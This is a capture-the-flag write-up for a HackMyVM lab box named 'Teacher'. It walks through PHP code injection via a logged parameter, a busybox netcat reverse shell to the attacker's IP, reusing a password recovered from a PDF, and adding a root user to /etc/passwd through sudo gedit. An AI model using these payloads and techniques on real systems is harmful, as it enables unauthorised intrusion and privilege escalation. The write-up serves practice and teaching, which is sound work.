# Teacher

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.203:22
Open 10.0.2.203:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.203
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1e:21:69:d3:57:da:3a:04:0b:6f:f4:50:fb:97:13:10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWB4gH2drtQb/K19wVAq9bYjb+vjtZjFjzrzs6efhPpZsFeUYAl1Fn9wZqMusEXUo7vbN9IGasXAZJlpRPsjktmiN81l6CBHr/tSPFi4SKLQSatxPpWRz1O5UbIbvtQnxUsFrXvGOYrEsyfHs59ObBCurBEUwNKPv2ScMVppPB/RGTpms+NdUZnXRk10gAvHdxbQHLeoebx5q2kOsy2rCCCUlReSJlQ1+eIGFXU4VnJllFLFelQRijy3fx6E+n/2cqCrFQSuJT6tm0BAQiVWkl5cmIvYOAH7+wvJpxfuiAO2QHZmjCgYd9QpUsUE0RGph7obIR2YLl16Km/Dq5mvogQMWGhE34lIngOS41o/qayH8VyMAzq5l/cyi9xHnIdHQo4i2qC2BiIS6TDwvC89ImAqj+/ZvNpIf4Kzpo4COn54eDcisr6Mt5+ste/yosd31gFR06sNaTz/gzNyycjjfQ8Ax3OaPfHLXDnPTrS9hnO4wNp/fGrafPzb7PL2r4lPc=
|   256 36:ee:7f:57:1d:a5:b5:ce:1f:41:ba:b0:43:32:2e:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBo2jFOsHUiYSNtxFpc+CJAyAzgbLT23oA5isBa6LkgriK89bDSLEIdPSqh4mInooAYBLTpSt+TBi/TdZndl5/g=
|   256 f2:bd:80:dd:e5:05:02:49:c3:3b:9f:83:29:cb:54:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxnV3nw0lbHTPeDjcsY0MSr4gC1Dlse5NI9StV1k+7d
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

### Fuzzing

```bash
└─$ curl http://10.0.2.203/
<html>
<h1>Hi student, make this server secure please.</h1>
<p>Our first server got hacked by cool and avijneyam in the first hour, that server was just a test but this server is important becouse this will be used for teaching, if we get hacked you are getting an F</p>
<!-- Yes mrteacher I will do it -->
</html>
```

```bash
└─$ feroxbuster -u http://10.0.2.203 --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.html
200      GET        5l       57w      315c http://10.0.2.203/
200      GET        1l        2w       12c http://10.0.2.203/access.php
200      GET        5l       57w      315c http://10.0.2.203/index.html
200      GET        4l        3w       24c http://10.0.2.203/log.php
301      GET        9l       28w      309c http://10.0.2.203/manual => http://10.0.2.203/manual/
```

```bas
└─$ curl http://10.0.2.203/access.php
<img src=''> 

└─$ curl http://10.0.2.203/log.php
your logs: rabbit.jpg

└─$ curl http://10.0.2.203/rabbit.jpg -Os
```

:sigh:
```bash
└─$ stegseek rabbit.jpg $rockyou
[i] Found passphrase: "rabbithole"
[i] Original filename: "secret.txt".
[i] Extracting to "rabbit.jpg.out".

└─$ cat rabbit.jpg.out
RabbitHole lol
```

```bash
└─$ ffuf -u 'http://10.0.2.203/access.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 12
id                      [Status: 200, Size: 23, Words: 2, Lines: 1, Duration: 18ms]
```

### Code Injection

**PHP Injection** not working?
```bash
└─$ curl 'http://10.0.2.203/access.php' -G --data-urlencode "id='><?php echo 'hi'; ?>'"
<img src=''><?php echo 'hi'; ?>''> 
```

`log.php` is keeping history of what we search, but it's not saving anything with `php` meaning it's getting executed or ignored
```bash
└─$ curl http://10.0.2.203/log.php -s | grep -v '^$' | head
your logs:
rabbit.jpg
/etc/passwd
/etc/passwd
'>hi</etc/passwd
/etc/passwd
'>hi'>hi<!--
'>hi'
'>hi'
'><iframe src='file://etc/passwd'></iframe>'
```

It's rendering
```bash
└─$ curl 'http://10.0.2.203/access.php' -G --data-urlencode $'id=<?=`id`?>'
└─$ curl http://10.0.2.203/log.php -s | grep -v '^$' | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl 'http://10.0.2.203/access.php' -G --data-urlencode $'id=<?=`busybox nc 10.0.2.149 4444 -e /bin/bash`?>'
└─$ curl http://10.0.2.203/log.php
└─$ penelope -p 4444
www-data@Teacher:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (teacher)

```bash
www-data@Teacher:/var/www/html$
[!] Session detached ⇲ # F12
(Penelope)─(Session [1])> download e14e1598b4271d8449e7fcda302b7975.pdf
[+] Download OK '/home/woyag/.penelope/sessions/Teacher~10.0.2.203-Linux-x86_64/downloads/var/www/html/e14e1598b4271d8449e7fcda302b7975.pdf'
```

The password had black smudge over it, but you can move objects :D

![writeup.png](/assets/pentest/hackmyvm/teacher/writeup.png)

::: tip Creds
`mrteacher:ThankYouTeachers`
:::

```bash
www-data@Teacher:/var/www/html$ su - mrteacher
Password: ThankYouTeachers
mrteacher@Teacher:~$ id
uid=1000(mrteacher) gid=1000(mrteacher) groups=1000(mrteacher),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)
```

### User.txt

```bash
mrteacher@Teacher:~$ cat user
9cd1f0b79d9474714c5a29214ec839a6
```

## Privilege Escalation (root)

```bash
mrteacher@Teacher:~$ sudo -l
Matching Defaults entries for mrteacher on Teacher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrteacher may run the following commands on Teacher:
    (ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth
```

First command doesn't seem usable
```bash
mrteacher@Teacher:~$ sudo /bin/gedit /etc/passwd
Unable to init server: Could not connect: Connection refused
(gedit:1069): Gtk-WARNING **: 12:37:47.694: cannot open display:
```

Still nothing
```bash
mrteacher@Teacher:~$ xauth list
Teacher/unix:10  MIT-MAGIC-COOKIE-1  b3386aefd470a6e309e54bc1be5eb774
mrteacher@Teacher:~$ sudo /bin/xauth add $(xauth list | head -1)
mrteacher@Teacher:~$ sudo /bin/gedit /etc/passwd
Unable to init server: Could not connect: Connection refused
(gedit:1082): Gtk-WARNING **: 12:39:40.507: cannot open display:
```

Turns out the key was to use `-X` during SSH and then we can use GUI 

![writeup-1.png](/assets/pentest/hackmyvm/teacher/writeup-1.png)

Add new root
```bash
└─$ echo "letmein:$(openssl passwd -6 x):0:0:letmein:/root:/bin/bash"
letmein:$6$jvOAL.NgRKn3pULs$IUhThthCSu32c1.WtQzBoXKM6i9RmB55/WS93ZbaRj2uzLAuHM5xp.0dapKFs83ih2mFfxJg9PhVtnfnIovY5/:0:0:letmein:/root:/bin/bash
```

```bash
mrteacher@Teacher:~$ su - letmein
Password: x
root@Teacher:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@Teacher:~# cat /root/root
HappyBack2Sch00l
```